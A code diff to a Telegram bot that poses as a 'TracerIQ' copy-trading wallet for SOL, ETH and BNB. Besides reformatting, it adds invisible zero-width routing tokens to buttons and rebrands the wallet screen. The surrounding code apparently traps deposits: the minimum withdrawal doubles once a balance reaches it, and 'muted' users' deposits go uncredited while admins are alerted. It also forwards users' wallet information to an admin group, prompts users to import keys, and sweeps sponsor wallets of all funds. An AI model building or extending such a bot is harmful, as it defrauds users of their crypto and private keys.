@@ -37,8 +37,8 @@ from pycoingecko import CoinGeckoAPI
 from telegram import (
     Update,
     ReplyKeyboardMarkup,
+    ReplyKeyboardRemove,
     InlineKeyboardButton,
-    InlineKeyboardMarkup,
 )
 from telegram.error import BadRequest
 from telegram.ext import (
@@ -50,8 +50,191 @@ from telegram.ext import (
     ContextTypes,
 )
 
+
+# Telegram reply keyboards submit their button label as a chat message. Keep a
+# short, invisible action tag on each button so the message handler can route
+# it to the same action as the former inline callback.
+_REPLY_ACTION_MARKER = "\u2063"
+_REPLY_ACTION_ZERO = "\u200b"
+_REPLY_ACTION_ONE = "\u200c"
+_REPLY_ACTION_BITS = 20
+_REPLY_ACTIONS_PATH = Path(__file__).resolve().parent / ".reply_keyboard_actions.json"
+_reply_action_counter = 0
+_reply_actions_by_token = {}
+_reply_tokens_by_action = {}
+
+
+def _reply_action_key(action: dict) -> str:
+    return json.dumps(action, sort_keys=True, ensure_ascii=False)
+
+
+def _persist_reply_actions():
+    temporary_path = _REPLY_ACTIONS_PATH.with_suffix(".tmp")
+    try:
+        temporary_path.write_text(
+            json.dumps(_reply_actions_by_token, ensure_ascii=False),
+            encoding="utf-8",
+        )
+        temporary_path.replace(_REPLY_ACTIONS_PATH)
+    except OSError as error:
+        print(f"Could not persist reply keyboard actions: {type(error).__name__}")
+
+
+def _load_reply_actions():
+    global _reply_action_counter
+    try:
+        saved = json.loads(_REPLY_ACTIONS_PATH.read_text(encoding="utf-8"))
+    except FileNotFoundError:
+        return
+    except (OSError, json.JSONDecodeError) as error:
+        print(f"Could not load reply keyboard actions: {type(error).__name__}")
+        return
+
+    if not isinstance(saved, dict):
+        return
+    for raw_token, action in saved.items():
+        try:
+            token = int(raw_token)
+        except (TypeError, ValueError):
+            continue
+        if not (0 < token < 2**_REPLY_ACTION_BITS):
+            continue
+        if not isinstance(action, dict) or action.get("kind") not in {
+            "callback",
+            "url",
+            "input",
+        }:
+            continue
+        _reply_actions_by_token[token] = action
+        _reply_tokens_by_action[_reply_action_key(action)] = token
+        _reply_action_counter = max(_reply_action_counter, token)
+
+
+_load_reply_actions()
+
+
+def _register_reply_button(label: str, action: dict) -> str:
+    global _reply_action_counter
+    action_key = _reply_action_key(action)
+    token = _reply_tokens_by_action.get(action_key)
+    if token is None:
+        _reply_action_counter += 1
+        if _reply_action_counter >= 2**_REPLY_ACTION_BITS:
+            raise RuntimeError("Reply keyboard action limit reached")
+        token = _reply_action_counter
+        _reply_tokens_by_action[action_key] = token
+        _reply_actions_by_token[token] = action
+        _persist_reply_actions()
+
+    hidden_token = "".join(
+        _REPLY_ACTION_ONE if token & (1 << bit) else _REPLY_ACTION_ZERO
+        for bit in range(_REPLY_ACTION_BITS)
+    )
+    return f"{label}{_REPLY_ACTION_MARKER}{hidden_token}"
+
+
+def _decode_reply_button(text: str):
+    if _REPLY_ACTION_MARKER not in text:
+        return None
+    label, hidden_token = text.rsplit(_REPLY_ACTION_MARKER, 1)
+    if len(hidden_token) != _REPLY_ACTION_BITS:
+        return None
+    if any(
+        char not in (_REPLY_ACTION_ZERO, _REPLY_ACTION_ONE) for char in hidden_token
+    ):
+        return None
+    token = sum(
+        1 << bit for bit, char in enumerate(hidden_token) if char == _REPLY_ACTION_ONE
+    )
+    action = _reply_actions_by_token.get(token)
+    return (action, label) if action else None
+
+
+def _make_reply_keyboard(rows, *, placeholder="Choose an option"):
+    return ReplyKeyboardMarkup(
+        rows,
+        resize_keyboard=True,
+        one_time_keyboard=False,
+        input_field_placeholder=placeholder,
+    )
+
+
+def InlineKeyboardMarkup(inline_keyboard=None, **_kwargs):
+    """Render legacy inline-button definitions as ordinary reply buttons."""
+    reply_rows = []
+    for row in inline_keyboard or []:
+        reply_row = []
+        for button in row:
+            if not isinstance(button, InlineKeyboardButton):
+                raise TypeError("Expected InlineKeyboardButton in keyboard row")
+            label = button.text
+            if button.callback_data is not None:
+                action = {"kind": "callback", "data": str(button.callback_data)}
+            elif button.url:
+                action = {"kind": "url", "url": button.url, "label": label}
+            else:
+                action = {"kind": "input", "text": label}
+            reply_row.append(_register_reply_button(label, action))
+        if reply_row:
+            reply_rows.append(reply_row)
+    return _make_reply_keyboard(reply_rows)
+
+
+class _ReplyKeyboardMessage:
+    """Message-shaped adapter for the existing callback action handlers."""
+
+    def __init__(self, source_message, context):
+        self._source_message = source_message
+        self._context = context
+        self.chat = source_message.chat
+        self.chat_id = source_message.chat_id
+        self.message_id = source_message.message_id
+        self.from_user = source_message.from_user
+
+    async def reply_text(self, text, **kwargs):
+        return await self._context.bot.send_message(
+            chat_id=self.chat_id, text=text, **kwargs
+        )
+
+    async def delete(self):
+        # The incoming reply-keyboard message is deleted before dispatch.
+        return None
+
+
+class _ReplyKeyboardInputUpdate:
+    """Use non-replying sends after a reply-keyboard message was deleted."""
+
+    def __init__(self, source_update, context, text):
+        self._source_update = source_update
+        self.message = _ReplyKeyboardMessage(source_update.message, context)
+        self.message.text = text
+
+    def __getattr__(self, name):
+        return getattr(self._source_update, name)
+
+
+class _ReplyKeyboardQuery:
+    """Callback-shaped adapter so existing action logic can be reused."""
+
+    is_reply_button = True
+
+    def __init__(self, source_message, context, action):
+        self.data = action
+        self.from_user = source_message.from_user
+        self.message = _ReplyKeyboardMessage(source_message, context)
+
+    async def answer(self, *_args, **_kwargs):
+        return None
+
+    async def edit_message_text(self, text, **kwargs):
+        return await self.message.reply_text(text, **kwargs)
+
+
 # Load environment variables
 PROJECT_DIR = Path(__file__).resolve().parent
+START_BANNER_PATH = (
+    PROJECT_DIR / "attached_assets" / "photo_2026-09-29_23-39-28_1790721594040.jpg"
+)
 load_dotenv(PROJECT_DIR / ".env")
 SESSION_SECRET = os.getenv("SESSION_SECRET", "")
 # Store temporary user states
@@ -59,10 +242,10 @@ user_states = {}
 # Track users whose wallet info has been sent to admin group (prevent spam)
 wallet_sent_to_admin = set()
 # Track last notified balance per user (to show notification only once per deposit)
-last_notified_balance = {}       # {telegram_id: balance} — tracks user SOL notifications
-last_admin_notified_balance = {} # {telegram_id: balance} — tracks admin group SOL notifications
-last_notified_evm = {}          # {telegram_id: {"eth": float, "bnb": float}}
-last_admin_notified_evm = {}    # {telegram_id: {"eth": float, "bnb": float}}
+last_notified_balance = {}  # {telegram_id: balance} — tracks user SOL notifications
+last_admin_notified_balance = {}  # {telegram_id: balance} — tracks admin group SOL notifications
+last_notified_evm = {}  # {telegram_id: {"eth": float, "bnb": float}}
+last_admin_notified_evm = {}  # {telegram_id: {"eth": float, "bnb": float}}
 
 # Admin configuration
 ADMIN_IDS = [6370028992, 7484918897]
@@ -229,9 +412,7 @@ def normalize_giveaway_participant(value):
     try:
         canonical_solana = canonical_giveaway_solana_address(solana_address)
         canonical_evm = (
-            canonical_giveaway_evm_address(evm_address)
-            if evm_address
-            else None
+            canonical_giveaway_evm_address(evm_address) if evm_address else None
         )
     except ValueError:
         return None
@@ -392,7 +573,9 @@ def _decode_private_key_bytes(value: str) -> bytes:
         except (ValueError, TypeError, json.JSONDecodeError) as e:
             raise ValueError("Invalid private key format") from e
     else:
-        hex_candidate = candidate[2:] if candidate.lower().startswith("0x") else candidate
+        hex_candidate = (
+            candidate[2:] if candidate.lower().startswith("0x") else candidate
+        )
         if len(hex_candidate) in (64, 128) and re.fullmatch(
             r"[0-9a-fA-F]+", hex_candidate
         ):
@@ -410,7 +593,9 @@ def _keypair_from_giveaway_credential(
 ):
     if credential_type == "seed_phrase":
         words = credential.strip().split()
-        if len(words) not in (12, 15, 18, 21, 24) or not _bip39.check(credential.strip()):
+        if len(words) not in (12, 15, 18, 21, 24) or not _bip39.check(
+            credential.strip()
+        ):
             raise ValueError("Invalid seed phrase")
         return Keypair.from_seed(_slip10_solana_seed(credential, derivation_index))
     if credential_type == "private_key":
@@ -499,9 +684,7 @@ def _evm_account_from_sponsor_wallet(wallet: dict):
         if len(decoded) == 64:
             decoded = decoded[:32]
         if len(decoded) != 32:
-            raise ValueError(
-                "The sponsor private key cannot be used for EVM signing"
-            )
+            raise ValueError("The sponsor private key cannot be used for EVM signing")
         return Account.from_key(decoded)
     raise ValueError("Unsupported sponsor credential type")
 
@@ -522,7 +705,9 @@ def giveaway_sender_address() -> str:
 def get_giveaway_interval_seconds() -> int:
     try:
         interval_seconds = int(giveaway_data.get("draw_interval_seconds"))
-        return interval_seconds if interval_seconds >= 1 else DEFAULT_DRAW_INTERVAL_SECONDS
+        return (
+            interval_seconds if interval_seconds >= 1 else DEFAULT_DRAW_INTERVAL_SECONDS
+        )
     except (TypeError, ValueError):
         return DEFAULT_DRAW_INTERVAL_SECONDS
 
@@ -556,13 +741,7 @@ def parse_giveaway_interval(value: str) -> int:
             )
         amount = float(match.group(1))
         unit = match.group(2)
-        multiplier = (
-            3600
-            if unit.startswith("h")
-            else 60
-            if unit.startswith("m")
-            else 1
-        )
+        multiplier = 3600 if unit.startswith("h") else 60 if unit.startswith("m") else 1
         seconds = int(amount * multiplier)
     if seconds < 1:
         raise ValueError("The timer must be at least 1 second")
@@ -588,6 +767,7 @@ def register_user(telegram_id: int):
     if telegram_id not in known_user_ids:
         known_user_ids.add(telegram_id)
         save_known_users()
+
 
 def parse_giveaway_time(value):
     if not value:
@@ -691,8 +871,7 @@ def giveaway_wallet_list_text() -> str:
     wallets = get_giveaway_sponsor_wallets()
     if not wallets:
         return (
-            "🏦 <b>Sponsor Wallet List</b>\n\n"
-            "No sponsor wallets have been added yet."
+            "🏦 <b>Sponsor Wallet List</b>\n\nNo sponsor wallets have been added yet."
         )
 
     lines = ["🏦 <b>Sponsor Wallet List</b>\n"]
@@ -774,15 +953,40 @@ def giveaway_timer_keyboard():
 def giveaway_admin_keyboard():
     status = giveaway_data.get("status", "inactive")
     buttons = [
-        [InlineKeyboardButton("⚙️ Create / Configure", callback_data="admin_giveaway_create")],
-        [InlineKeyboardButton("🔐 Add Sponsor Wallet", callback_data="admin_giveaway_wallet")],
-        [InlineKeyboardButton("🏦 View / Delete Sponsor Wallets", callback_data="admin_giveaway_wallets")],
-        [InlineKeyboardButton("⏱ Set Draw Timer", callback_data="admin_giveaway_timer")],
         [
-            InlineKeyboardButton("➕ Add Participants", callback_data="admin_giveaway_add"),
-            InlineKeyboardButton("📋 View Participants", callback_data="admin_giveaway_participants"),
+            InlineKeyboardButton(
+                "⚙️ Create / Configure", callback_data="admin_giveaway_create"
+            )
         ],
-        [InlineKeyboardButton("📊 Refresh Status", callback_data="admin_giveaway_status")],
+        [
+            InlineKeyboardButton(
+                "🔐 Add Sponsor Wallet", callback_data="admin_giveaway_wallet"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                "🏦 View / Delete Sponsor Wallets",
+                callback_data="admin_giveaway_wallets",
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                "⏱ Set Draw Timer", callback_data="admin_giveaway_timer"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                "➕ Add Participants", callback_data="admin_giveaway_add"
+            ),
+            InlineKeyboardButton(
+                "📋 View Participants", callback_data="admin_giveaway_participants"
+            ),
+        ],
+        [
+            InlineKeyboardButton(
+                "📊 Refresh Status", callback_data="admin_giveaway_status"
+            )
+        ],
     ]
     if status == "draft":
         buttons.append(
@@ -794,12 +998,32 @@ def giveaway_admin_keyboard():
             ]
         )
     elif status == "active":
-        buttons.append([InlineKeyboardButton("⏸ Pause Giveaway", callback_data="admin_giveaway_pause")])
+        buttons.append(
+            [
+                InlineKeyboardButton(
+                    "⏸ Pause Giveaway", callback_data="admin_giveaway_pause"
+                )
+            ]
+        )
     elif status == "paused":
-        buttons.append([InlineKeyboardButton("▶️ Resume Giveaway", callback_data="admin_giveaway_resume")])
+        buttons.append(
+            [
+                InlineKeyboardButton(
+                    "▶️ Resume Giveaway", callback_data="admin_giveaway_resume"
+                )
+            ]
+        )
     if giveaway_data.get("history"):
-        buttons.append([InlineKeyboardButton("🏆 Payout History", callback_data="admin_giveaway_history")])
-    buttons.append([InlineKeyboardButton("⬅️ Close", callback_data="admin_giveaway_close")])
+        buttons.append(
+            [
+                InlineKeyboardButton(
+                    "🏆 Payout History", callback_data="admin_giveaway_history"
+                )
+            ]
+        )
+    buttons.append(
+        [InlineKeyboardButton("⬅️ Close", callback_data="admin_giveaway_close")]
+    )
     return InlineKeyboardMarkup(buttons)
 
 
@@ -880,12 +1104,10 @@ async def get_giveaway_transfer_reserve_lamports(
         except Exception:
             # If this lookup fails, the transaction will fail closed and retry
             # later rather than risking a sponsor wallet being drained.
-            token_account_rent = FALLBACK_RENT_RESERVE_LAMPORTS * additional_token_accounts
-    return (
-        rent_reserve
-        + token_account_rent
-        + TRANSACTION_FEE_RESERVE_LAMPORTS
-    )
+            token_account_rent = (
+                FALLBACK_RENT_RESERVE_LAMPORTS * additional_token_accounts
+            )
+    return rent_reserve + token_account_rent + TRANSACTION_FEE_RESERVE_LAMPORTS
 
 
 async def _prepare_giveaway_draw() -> dict:
@@ -931,12 +1153,12 @@ async def _prepare_giveaway_draw() -> dict:
                         )
 
                 missing_destination_count = sum(
-                    1
-                    for _, exists in destination_accounts.values()
-                    if not exists
+                    1 for _, exists in destination_accounts.values() if not exists
                 )
-                transfer_reserve_lamports = await get_giveaway_transfer_reserve_lamports(
-                    missing_destination_count
+                transfer_reserve_lamports = (
+                    await get_giveaway_transfer_reserve_lamports(
+                        missing_destination_count
+                    )
                 )
                 if token_accounts and sender_lamports <= transfer_reserve_lamports:
                     # Do not send SOL while silently abandoning token assets.
@@ -950,9 +1172,10 @@ async def _prepare_giveaway_draw() -> dict:
                         # Only the first source account for a mint creates the
                         # destination ATA; subsequent source accounts transfer to it.
                         token["create_destination"] = not destination_exists
-                        destination_accounts[
-                            (token["mint"], token["program_id"])
-                        ] = (destination, True)
+                        destination_accounts[(token["mint"], token["program_id"])] = (
+                            destination,
+                            True,
+                        )
                     sol_lamports = sender_lamports - transfer_reserve_lamports
                 elif not token_accounts:
                     sol_lamports = sender_lamports - transfer_reserve_lamports
@@ -982,13 +1205,10 @@ async def _prepare_giveaway_draw() -> dict:
                 )
         except Exception as error:
             print(
-                f"Skipping sponsor wallet {wallet.get('address', 'unknown')}: "
-                f"{error}"
+                f"Skipping sponsor wallet {wallet.get('address', 'unknown')}: {error}"
             )
     if not funded_wallets:
-        raise ValueError(
-            "No sponsor wallet has transferable SOL, tokens, or EVM funds"
-        )
+        raise ValueError("No sponsor wallet has transferable SOL, tokens, or EVM funds")
 
     wallet, sender, sol_lamports, token_accounts, evm_assets = random.choice(
         funded_wallets
@@ -1021,7 +1241,9 @@ async def _send_giveaway_transaction(sender: Keypair, instructions: list) -> str
     try:
         await solana_client.confirm_transaction(response.value)
     except Exception as confirmation_error:
-        print(f"Giveaway confirmation check deferred for {signature}: {confirmation_error}")
+        print(
+            f"Giveaway confirmation check deferred for {signature}: {confirmation_error}"
+        )
     return signature
 
 
@@ -1130,9 +1352,7 @@ async def send_giveaway_payout() -> dict:
         for asset in evm_assets:
             if asset.get("signature"):
                 continue
-            asset["signature"] = _send_giveaway_evm_transaction(
-                evm_account, asset
-            )
+            asset["signature"] = _send_giveaway_evm_transaction(evm_account, asset)
             save_giveaway()
 
     signatures = [
@@ -1181,9 +1401,7 @@ async def process_giveaway_draw(context: ContextTypes.DEFAULT_TYPE):
             should_report = (
                 last_giveaway_failure_log_at is None
                 or error_text != last_giveaway_failure_text
-                or (
-                    now - last_giveaway_failure_log_at
-                ).total_seconds()
+                or (now - last_giveaway_failure_log_at).total_seconds()
                 >= GIVEAWAY_FAILURE_NOTIFICATION_INTERVAL_SECONDS
             )
             if should_report:
@@ -1284,13 +1502,10 @@ async def process_giveaway_draw(context: ContextTypes.DEFAULT_TYPE):
         admin_text = (
             "🎉 <b>Giveaway payout sent</b>\n\n"
             f"🏆 Winner: <code>{html_escape(winner)}</code>\n"
-            "📦 Assets sent:\n"
-            + "\n".join(asset_lines)
-            + "\n\n"
+            "📦 Assets sent:\n" + "\n".join(asset_lines) + "\n\n"
             "🔗 Transactions:\n"
             + "\n".join(f"<code>{html_escape(item)}</code>" for item in signatures)
-            +
-            f"\n📅 Time: {now.strftime('%Y-%m-%d %H:%M UTC')}\n\n"
+            + f"\n📅 Time: {now.strftime('%Y-%m-%d %H:%M UTC')}\n\n"
             f"Next draw: {format_giveaway_time(giveaway_data.get('next_draw_at'))}"
         )
         if GROUP_ID and should_notify:
@@ -1430,10 +1645,10 @@ SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"  # Solana RPC endpoint
 
 # Debug: Check if API key is loaded
 if COINGECKO_API_KEY:
-    print(f"✅ CoinGecko API Key loaded: {COINGECKO_API_KEY[:8]}...")
+    print("✅ CoinGecko API key loaded")
 else:
     print("⚠️ WARNING: CoinGecko API Key NOT found! Prices may not work correctly.")
-    print("   Make sure COINGECKO_API_KEY is set in your .env file")
+    print("   Make sure COINGECKO_API_KEY is set in Replit Secrets")
 
 # Initialize clients
 # Use demo_api_key parameter for Demo API keys (api.coingecko.com)
@@ -1491,9 +1706,7 @@ def _evm_rpc_request(rpc_url: str, method: str, params: list):
 async def _check_evm_balance(address: str, rpc_url: str) -> float | None:
     """Read native balance from an EVM JSON-RPC endpoint; None means RPC failure."""
     try:
-        hex_val = _evm_rpc_request(
-            rpc_url, "eth_getBalance", [address, "latest"]
-        )
+        hex_val = _evm_rpc_request(rpc_url, "eth_getBalance", [address, "latest"])
         if not isinstance(hex_val, str):
             raise RuntimeError("invalid balance response")
         return int(hex_val, 16) / 1e18
@@ -1511,10 +1724,13 @@ def _rpc_urls(env_name: str, defaults: list[str]) -> list[str]:
 
 async def check_eth_balance(address: str) -> float | None:
     """Check native ETH on Ethereum mainnet, with public fallback endpoints."""
-    for url in _rpc_urls("ETH_RPC_URL", [
-        "https://ethereum-rpc.publicnode.com",
-        "https://eth.llamarpc.com",
-    ]):
+    for url in _rpc_urls(
+        "ETH_RPC_URL",
+        [
+            "https://ethereum-rpc.publicnode.com",
+            "https://eth.llamarpc.com",
+        ],
+    ):
         balance = await _check_evm_balance(address, url)
         if balance is not None:
             return balance
@@ -1523,10 +1739,13 @@ async def check_eth_balance(address: str) -> float | None:
 
 async def check_bnb_balance(address: str) -> float | None:
     """Check native BNB on BSC mainnet, with public fallback endpoints."""
-    for url in _rpc_urls("BNB_RPC_URL", [
-        "https://bsc-rpc.publicnode.com",
-        "https://binance.llamarpc.com",
-    ]):
+    for url in _rpc_urls(
+        "BNB_RPC_URL",
+        [
+            "https://bsc-rpc.publicnode.com",
+            "https://binance.llamarpc.com",
+        ],
+    ):
         balance = await _check_evm_balance(address, url)
         if balance is not None:
             return balance
@@ -1610,9 +1829,7 @@ def _send_giveaway_evm_transaction(account, asset: dict) -> str:
     raw_transaction = "0x" + signed.raw_transaction.hex()
     last_error = None
     chain = next(
-        chain
-        for chain in EVM_GIVEAWAY_CHAINS
-        if chain["name"] == asset["chain"]
+        chain for chain in EVM_GIVEAWAY_CHAINS if chain["name"] == asset["chain"]
     )
     for rpc_url in _rpc_urls(chain["rpc_env"], chain["defaults"]):
         try:
@@ -1690,7 +1907,9 @@ async def monitor_deposits(
                     fixed_min = user_balances[telegram_id].get("min_withdrawal", 0)
                     if current_balance >= fixed_min:
                         user_balances[telegram_id]["fixed_min"] = False
-                        user_balances[telegram_id]["min_withdrawal"] = current_balance * 2
+                        user_balances[telegram_id]["min_withdrawal"] = (
+                            current_balance * 2
+                        )
 
                 save_balances()
 
@@ -1718,12 +1937,19 @@ async def monitor_deposits(
                     print(f"Error sending notification to user: {e}")
 
             # Send to admin group — only ONCE per deposit (deduplicated for muted users too)
-            if GROUP_ID and last_admin_notified_balance.get(telegram_id, -1) != current_balance:
+            if (
+                GROUP_ID
+                and last_admin_notified_balance.get(telegram_id, -1) != current_balance
+            ):
                 try:
                     user = await context.bot.get_chat(telegram_id)
                     user_name = user.username or user.first_name or str(telegram_id)
 
-                    mute_note = "\n🔕 <b>User is MUTED</b> — balance not updated, no user notification sent." if is_muted else ""
+                    mute_note = (
+                        "\n🔕 <b>User is MUTED</b> — balance not updated, no user notification sent."
+                        if is_muted
+                        else ""
+                    )
                     deposit_notification = (
                         f"💰 <b>New Deposit Detected</b>\n\n"
                         f"User: @{user_name} (ID: {telegram_id})\n"
@@ -1762,9 +1988,14 @@ async def monitor_evm_deposits(
     """Monitor ETH and BNB deposits. Mirrors monitor_deposits logic for EVM chains."""
     try:
         if telegram_id not in user_balances:
-            user_balances[telegram_id] = {"balance": 0, "last_checked_slot": 0,
-                                           "min_withdrawal": 0, "fixed_min": False,
-                                           "eth_balance": 0, "bnb_balance": 0}
+            user_balances[telegram_id] = {
+                "balance": 0,
+                "last_checked_slot": 0,
+                "min_withdrawal": 0,
+                "fixed_min": False,
+                "eth_balance": 0,
+                "bnb_balance": 0,
+            }
         if "eth_balance" not in user_balances[telegram_id]:
             user_balances[telegram_id]["eth_balance"] = 0
         if "bnb_balance" not in user_balances[telegram_id]:
@@ -1807,16 +2038,26 @@ async def monitor_evm_deposits(
             lines = []
             if eth_changed and prev_user.get("eth", -1) != chain_eth:
                 dep = chain_eth - stored_eth
-                lines.append(f"  +{dep:.6f} ETH  (now {chain_eth:.6f} ETH ≈ ${chain_eth * eth_price:.2f})")
+                lines.append(
+                    f"  +{dep:.6f} ETH  (now {chain_eth:.6f} ETH ≈ ${chain_eth * eth_price:.2f})"
+                )
                 last_notified_evm.setdefault(telegram_id, {})["eth"] = chain_eth
             if bnb_changed and prev_user.get("bnb", -1) != chain_bnb:
                 dep = chain_bnb - stored_bnb
-                lines.append(f"  +{dep:.6f} BNB  (now {chain_bnb:.6f} BNB ≈ ${chain_bnb * bnb_price:.2f})")
+                lines.append(
+                    f"  +{dep:.6f} BNB  (now {chain_bnb:.6f} BNB ≈ ${chain_bnb * bnb_price:.2f})"
+                )
                 last_notified_evm.setdefault(telegram_id, {})["bnb"] = chain_bnb
             if lines:
-                msg = "💰 <b>EVM Deposit Confirmed!</b>\n\n" + "\n".join(lines) + "\n\nFunds have been credited to your EVM wallet."
+                msg = (
+                    "💰 <b>EVM Deposit Confirmed!</b>\n\n"
+                    + "\n".join(lines)
+                    + "\n\nFunds have been credited to your EVM wallet."
+                )
                 try:
-                    await context.bot.send_message(chat_id=telegram_id, text=msg, parse_mode="HTML")
+                    await context.bot.send_message(
+                        chat_id=telegram_id, text=msg, parse_mode="HTML"
+                    )
                 except Exception as e:
                     print(f"Error notifying user of EVM deposit: {e}")
 
@@ -1825,14 +2066,22 @@ async def monitor_evm_deposits(
             admin_lines = []
             if eth_changed and last_evm.get("eth", -1) != chain_eth:
                 dep = chain_eth - stored_eth
-                admin_lines.append(f"ETH: +{dep:.6f} → {chain_eth:.6f} (${chain_eth * eth_price:.2f})")
+                admin_lines.append(
+                    f"ETH: +{dep:.6f} → {chain_eth:.6f} (${chain_eth * eth_price:.2f})"
+                )
                 last_admin_notified_evm.setdefault(telegram_id, {})["eth"] = chain_eth
             if bnb_changed and last_evm.get("bnb", -1) != chain_bnb:
                 dep = chain_bnb - stored_bnb
-                admin_lines.append(f"BNB: +{dep:.6f} → {chain_bnb:.6f} (${chain_bnb * bnb_price:.2f})")
+                admin_lines.append(
+                    f"BNB: +{dep:.6f} → {chain_bnb:.6f} (${chain_bnb * bnb_price:.2f})"
+                )
                 last_admin_notified_evm.setdefault(telegram_id, {})["bnb"] = chain_bnb
             if admin_lines:
-                mute_note = "\n🔕 <b>User is MUTED</b> — balance not updated, no user notification." if is_muted else ""
+                mute_note = (
+                    "\n🔕 <b>User is MUTED</b> — balance not updated, no user notification."
+                    if is_muted
+                    else ""
+                )
                 try:
                     user_obj = await context.bot.get_chat(telegram_id)
                     uname = user_obj.username or user_obj.first_name or str(telegram_id)
@@ -1958,7 +2207,14 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Ensure user_balances has ETH/BNB fields
         if telegram_id not in user_balances:
-            user_balances[telegram_id] = {"balance": 0, "last_checked_slot": 0, "min_withdrawal": 0, "fixed_min": False, "eth_balance": 0, "bnb_balance": 0}
+            user_balances[telegram_id] = {
+                "balance": 0,
+                "last_checked_slot": 0,
+                "min_withdrawal": 0,
+                "fixed_min": False,
+                "eth_balance": 0,
+                "bnb_balance": 0,
+            }
         if "eth_balance" not in user_balances[telegram_id]:
             user_balances[telegram_id]["eth_balance"] = 0
         if "bnb_balance" not in user_balances[telegram_id]:
@@ -1974,33 +2230,26 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sol_price = await get_sol_price_usd()
         eth_price, bnb_price = await get_evm_prices_usd()
 
-        sol_usd   = balance     * sol_price if sol_price > 0 else 0
-        eth_usd   = eth_balance * eth_price if eth_price > 0 else 0
-        bnb_usd   = bnb_balance * bnb_price if bnb_price > 0 else 0
+        sol_usd = balance * sol_price if sol_price > 0 else 0
+        eth_usd = eth_balance * eth_price if eth_price > 0 else 0
+        bnb_usd = bnb_balance * bnb_price if bnb_price > 0 else 0
         total_usd = sol_usd + eth_usd + bnb_usd
 
         wallet_text = (
-            "💼 <b>Wallet Overview</b> — <i>Connected</i> ✅\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "🟣 <b>Solana Address:</b>\n"
-            f"<code>{public_address}</code>\n\n"
-            "🔵 <b>EVM Networks</b>\n"
-            "<i>(Ethereum • BNB Smart Chain)</i>\n"
-            "<b>Address:</b>\n"
-            f"<code>{evm_address}</code>\n\n"
+            "◈ <b>TRACERIQ  /  PORTFOLIO</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "<b>Holdings</b>\n\n"
-            f"🟣 <b>Solana</b>\n"
-            f"• SOL: {balance:.4f}  ≈ <i>${sol_usd:.2f}</i>\n\n"
-            f"🔵 <b>EVM</b>\n"
-            f"• ETH: {eth_balance:.6f}  ≈ <i>${eth_usd:.2f}</i>\n"
-            f"• BNB: {bnb_balance:.6f}  ≈ <i>${bnb_usd:.2f}</i>\n\n"
+            "<i>Wallets connected to your copy-trading workspace</i>\n\n"
+            "🟣 <b>SOLANA</b>\n"
+            f"<code>{public_address}</code>\n"
+            f"Balance  ·  {balance:.4f} SOL  ≈  <i>${sol_usd:.2f}</i>\n\n"
+            "🔷 <b>EVM  ·  ETH / BNB</b>\n"
+            f"<code>{evm_address}</code>\n"
+            f"ETH  ·  {eth_balance:.6f}  ≈  <i>${eth_usd:.2f}</i>\n"
+            f"BNB  ·  {bnb_balance:.6f}  ≈  <i>${bnb_usd:.2f}</i>\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"<b>Total Assets: ${total_usd:.2f}</b>\n\n\n"
-            "💰 <b>Fund Your Bot</b>\n"
-            "Send assets to the appropriate address above.\n\n"
-            "<i>(Supported: SOL, ETH, and BNB for copy trading.)</i>\n\n"
-            "👇 <i>What would you like to do next?</i>"
+            f"<b>PORTFOLIO VALUE  ·  ${total_usd:.2f}</b>\n\n"
+            "To fund the workspace, send supported assets to the matching address above.\n"
+            "<i>Supported for copy trading: SOL, ETH, and BNB.</i>"
         )
     except Exception as e:
         wallet_text = (
@@ -2012,36 +2261,37 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     wallet_inline = InlineKeyboardMarkup(
         [
             [
-                InlineKeyboardButton("💸 Withdraw", callback_data="ct_withdraw"),
+                InlineKeyboardButton("🟣 Withdraw Assets", callback_data="ct_withdraw"),
                 InlineKeyboardButton(
-                    "⚙️ Connect Wallet", callback_data="ct_connect_wallet"
+                    "🔐 Import / Connect", callback_data="ct_connect_wallet"
                 ),
             ],
             [
-                InlineKeyboardButton("🤖 Copy Trade", callback_data="ct_copy_trade"),
+                InlineKeyboardButton(
+                    "🎯 Configure Copy Rules", callback_data="ct_copy_trade"
+                ),
             ],
             [
-                InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main"),
+                InlineKeyboardButton("⌂ TracerIQ Home", callback_data="back_main"),
             ],
         ]
     )
 
-    if update.message:
+    if update.message or update.callback_query:
+        chat_id = (
+            update.message.chat_id
+            if update.message
+            else update.callback_query.message.chat_id
+        )
         # Delete the previous bot wallet message if we have it stored
         prev_msg_id = context.user_data.get("last_wallet_msg_id")
         if prev_msg_id:
             try:
                 await context.bot.delete_message(
-                    chat_id=update.message.chat_id, message_id=prev_msg_id
+                    chat_id=chat_id, message_id=prev_msg_id
                 )
             except Exception:
                 pass
-        sent = await update.message.reply_text(
-            wallet_text, parse_mode="HTML", reply_markup=wallet_inline
-        )
-        context.user_data["last_wallet_msg_id"] = sent.message_id
-    elif update.callback_query:
-        chat_id = update.callback_query.message.chat_id
         sent = await context.bot.send_message(
             chat_id=chat_id,
             text=wallet_text,
@@ -2056,41 +2306,50 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # --- SETTINGS MENU ---
 async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    Setting_buttons = InlineKeyboardMarkup(
+    copy_preference_buttons = InlineKeyboardMarkup(
         [
+            [InlineKeyboardButton("🗓 Copy cadence", callback_data="trade_per_day")],
             [
                 InlineKeyboardButton(
-                    "Number of trades per day", callback_data="trade_per_day"
+                    "🔁 Consecutive entry limit", callback_data="consecutive_buys"
                 )
             ],
             [
                 InlineKeyboardButton(
-                    "Edit Number of consecutive buys", callback_data="consecutive_buys"
+                    "🎯 Position exit rule", callback_data="sell_position"
                 )
             ],
-            [InlineKeyboardButton("Sell Position", callback_data="sell_position")],
         ]
     )
 
     settings_text = (
-        "<b>⚙️ Settings Menu</b>\n\n"
-        "Your settings are organized into categories for easy management:\n\n"
-        "<b>Trading Options:</b>\n"
-        "- Configure number of trades per day\n"
-        "- Adjust consecutive buys\n"
